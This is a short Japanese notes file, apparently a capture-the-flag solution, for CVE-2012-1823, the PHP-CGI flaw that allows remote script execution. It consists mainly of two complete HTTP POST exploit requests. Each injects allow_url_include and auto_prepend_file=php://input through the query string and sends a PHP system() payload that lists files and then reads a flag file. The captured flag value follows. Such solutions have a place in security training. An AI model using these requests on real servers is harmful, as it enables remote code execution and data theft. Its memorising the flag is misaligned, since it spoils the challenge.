@@ -1,0 +1,20 @@
+CVE-2012-1823
+CGI版PHPにリモートからスクリプト実行を許す脆弱性
+
+POST /~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input HTTP/1.0
+Content-Length: 22
+
+
+<?php system('ls'); ?>
+
+POST /~q12/index.php?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input HTTP/1.0
+Content-Length: 42
+
+
+<?php system('cat flag_flag_flag.txt'); ?>
+
+
+
+bodyの部分の入力は２回改行してから
+
+FLAG_ZysbiGgbHrN3f9zs
